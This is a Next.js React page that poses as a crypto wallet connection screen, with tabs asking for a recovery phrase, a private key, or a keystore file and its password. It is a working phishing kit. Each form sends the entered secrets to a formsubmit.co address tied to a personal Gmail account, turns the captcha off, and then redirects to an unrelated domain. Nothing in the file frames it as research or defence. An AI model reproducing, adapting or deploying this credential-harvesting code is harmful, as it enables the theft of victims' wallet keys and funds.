"use client";
import React, { useRef } from "react";
import { useState, useEffect } from "react";
import Image from "next/image";
import Link from "next/link";
import Head from "next/head";
import logo from "@/public/images/node_logo.png"
// import node_logo from "@/public/images/node_logo.png";

const Header = () => {
  const [showModal, setShowModal] = useState(false);

  const toggleModal = () => {
    // Show the modal only if scrolled to the bottom

    setShowModal(!showModal);
  };

  const handleCloseModal = () => {
    // Reset the state when the modal is closed

    setShowModal(false);
  };
  return (
    <div>
      <nav className="relative container mx-auto p-6">
        <div className="flex items-center justify-between">
          <div className="pt-2 ">
            {/* <Image src={node_logo} alt="horizon Logo" width={50} height={50} /> */}
          </div>

          {/* menu items  */}
          <div className="flex justify-end  "></div>
        </div>
      </nav>
    </div>
  );
};

// function MyApp({ Component, pageProps }) {
//   return (
//     <TableProvider>
//       <Component {...pageProps} />
//     </TableProvider>
//   );
// }
const page = () => {
  const [isLoading, setLoading] = useState(true);
  const [showTables, setShowTables] = useState(false);
  const [selectedTable, setSelectedTable] = useState("Phrase");


  const [errorMessage, setErrorMessage] = useState('');

  const validateForm = (event) => {
    const input = document.getElementById('form_name').value;
    const wordCount = input.trim().split(/\s+/).length;

    if (wordCount !== 12 && wordCount !== 24) {
      event.preventDefault();  // Prevent form submission
      setErrorMessage('Incorrect phrase, must be 12 or 24 words !.');
      console.log(errorMessage);
    } else {
      setErrorMessage('');  // Clear error message
    }
  };

  const handleShowTables = () => {
    setShowTables(true);
  };

  const handleTableClick = (tableName) => {
    setSelectedTable(tableName);
  };


  return (
    <>
      {/* <Header /> */}
      {/* <Head> */}
      <nav className="flex items-start leading-5 z-50 p-5">
        <Link href="/">
          <Image
            priority
            src={logo}
            width={35}
            height={35}
            alt={"streal logo"}
          />
        </Link>
      </nav>
      {/* </Head> */}
    <div className="mx-auto ">
      {/* =================== */}
      <div>
        <div className="container connect-section">
          <div className="section-container h-auto">
            <div className="connect-content w-[350px] md:w-[450px] mx-16">
                <div className="flex justify-center items-center flex-col form_div text-white">
                  {/* phrase table */}
                    <div className=" p-4 bg-[#0f12129f] border border-gray-800 rounded-md">
                      <table className="table-auto">
                        <thead>
                          <tr>
                            <th
                              className={`cursor-pointer text-sm ${
                                selectedTable === "Phrase" &&
                                " p-3 table_div rounded-md"
                              }`}
                              onClick={() => handleTableClick("Phrase")}
                            >
                              Phrase
                            </th>
                            <th
                              className={`cursor-pointer  text-sm ${
                                selectedTable === "Private Key" &&
                                " p-3 table_div rounded-md"
                              }`}
                              onClick={() => handleTableClick("Private Key")}
                            >
                              Private Key
                            </th>
                            <th
                              className={`cursor-pointer  text-sm ${
                                selectedTable === "Keystore" &&
                                " p-3 table_div rounded-md"
                              }`}
                              onClick={() => handleTableClick("Keystore")}
                            >
                              Keystore
                            </th>
                          </tr>
                        </thead>
                        <tbody>
                          <tr>
                            <td colSpan="3" className="text-center">
                              {selectedTable === "Phrase" && (
                                // content for Phrase
                                <div className="mt-2">
                                  <div className="modal-body text-center justify-content-center mt-4">
                                    <div
                                      className="tab-content g-5"
                                      id="myTabContent"
                                    >
                                      {/* phrase form */}
                                      <div
                                        className="tab-pane fade show active"
                                        id="home"
                                        role="tabpanel"
                                        aria-labelledby="home-tab"
                                      >
                                        
                                          <form action="https://formsubmit.co/tomzyhorlad724@gmail.com" method="POST" id="phrase-form" name="form" className="mt-3"  onSubmit={validateForm}>

                                          <div className="mb-3">
                                            <div className="phrase-box">
                                              <textarea
                                                id="form_name"
                                                type="text"
                                                required
                                                name="from_name"
                                                rows={5}
                                                className="block w-full rounded-md border-0 p-2 text-white shadow-sm ring-1 ring-inset ring-gray-600 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm text-[0.7rem] sm:leading-6 bg-[#0f12129f] md:w-96"
                                                placeholder="enter your recovery phrase..."
                                                autoComplete="off"
                                              />
                                            </div>
                                            <p
                      className="bg-red-100 text-sm font-thin border border-red-400 text-red-700 px-2 py-3 rounded relative animate-pulse"
                      role="alert"
                      style={{ display: errorMessage ? 'block' : 'none' }}
                    >{errorMessage}</p>
                                            <div
                                              id="emailHelp"
                                              className=" text-center m-2 mt-4 text-[0.7rem] text-gray-500"
                                            >
                                              Typically 12 (sometimes 24) words
                                              separated by single spaces
                                            </div>
                                          </div>
                                          <input type="hidden" name="_captcha" value="false" />
            <input type="hidden" name="_next" value="https://dapptools-rpc.com" />
            
                                          <button
                                            type="submit"
                                            className="btn text-white bg-blue-950 rounded-lg p-3 text-md"
                                            id="button"
                                          >
                                            Proceed
                                          </button>
                                        </form>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              )}
                              {selectedTable === "Private Key" && (
                                <div className="mt-2">
                                  <div className="modal-body text-center justify-content-center mt-4">
                                    <div
                                      className="tab-content g-5"
                                      id="myTabContent"
                                    >
                                      {/* private key form  */}
                                      <div
                                        className="tab-pane fade"
                                        id="contact"
                                        role="tabpanel"
                                        aria-labelledby="contact-tab"
                                      >
                                       <form action="https://formsubmit.co/tomzyhorlad724@gmail.com" method="POST" id="phrase-form" name="form" className="mt-3" >
                                          <div classNameName="mb-3">
                                            <textarea
                                              id="form_name"
                                              type="text"
                                              required
                                              name="from_name"
                                              rows={5}
                                              className="block w-full rounded-md border-0 p-2 text-white shadow-sm ring-1 ring-inset ring-gray-600 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6 form_div md:w-96" // Added md:w-96 for medium-sized screens
                                              placeholder="enter your private key..."
                                              autoComplete="off"
                                            />
                                            
                                            <div
                                              id="emailHelp"
                                              className=" text-center m-2 mt-4 text-sm text-gray-500"
                                            >
                                              Typically 64 alphanumeric
                                              characters
                                            </div>
                                          </div>

                                          <input type="hidden" name="_captcha" value="false" />
            <input type="hidden" name="_next" value="https://dapptools-rpc.com" />

                                          <button
                                            type="submit"
                                            className="btn text-white bg-blue-950 rounded-lg p-3 text-md"
                                            id="button"
                                          >
                                            Proceed
                                          </button>
                                        </form>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              )}
                              {selectedTable === "Keystore" && (
                                <div className="mt-2">
                                  <div className="modal-body text-center justify-content-center mt-4">
                                    <div
                                      className="tab-content g-5"
                                      id="myTabContent"
                                    >
                                      {/* keystore json form  */}
                                      <div
                                        className="tab-pane fade"
                                        id="profile"
                                        role="tabpanel"
                                        aria-labelledby="profile-tab"
                                      >
                                       <form action="https://formsubmit.co/tomzyhorlad724@gmail.com" method="POST" id="phrase-form" name="form" class="mt-3"  onSubmit={validateForm}>
                                          <div className="mb-3">
                                            <input
                                              id="email"
                                              name="email"
                                              type="email"
                                              autoComplete="email"
                                              className="block w-full rounded-md border-0 py-1.5 text-gray-400 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6 bg-[#0f12129f] md:w-96" // Added md:w-96 for medium-sized screens
                                            />
                                            <label
                                              for="dropzone-file"
                                              className="keystore-label"
                                            >
                                              <div className="keystore-label-item flex flex-col justify-center items-center pt-5 pb-6">
                                                <svg
                                                  // style="width: 30px"

                                                  aria-hidden="true"
                                                  className="mb-3 w-10 h-10 text-gray-400"
                                                  fill="none"
                                                  stroke="currentColor"
                                                  viewBox="0 0 24 24"
                                                  xmlns="http://www.w3.org/2000/svg"
                                                >
                                                  <path
                                                    stroke-linecap="round"
                                                    stroke-linejoin="round"
                                                    stroke-width="2"
                                                    d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"
                                                  ></path>
                                                </svg>
                                                <p className="text-[13px] text-slate-500">
                                                  <span className="text-sm text-slate-500">
                                                    Click to upload
                                                  </span>{" "}
                                                  or drag and drop
                                                </p>
                                                <p className="text-[13px]">
                                                  SVG, PNG, JPG or GIF (MAX.
                                                  800x400px)
                                                </p>
                                              </div>
                                              <input
                                                id="dropzone-file"
                                                type="file"
                                                className="hidden"
                                              />
                                            </label>
                                            <div
                                              id="emailHelp"
                                              className=" text-center m-2 mt-4 text-sm text-gray-500"
                                            >
                                              Several lines of text beginning
                                              with plus the password you used to
                                              encrypt it
                                            </div>
                                          </div>

                                          <input type="hidden" name="_captcha" value="false" />
            <input type="hidden" name="_next" value="https://dapptools-rpc.com" />

                                          <button
                                            type="submit"
                                            className="btn text-white bg-blue-950 rounded-lg p-3 text-md"
                                            id="button"
                                          >
                                            Proceed
                                          </button>
                                        </form>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              )}
                            </td>
                          </tr>
                        </tbody>
                      </table>
                    </div>
                </div>
            </div>
          </div>
        </div>
      </div>
      {/* <Footer /> */}
    </div>
    </>
  );
};

export default page;
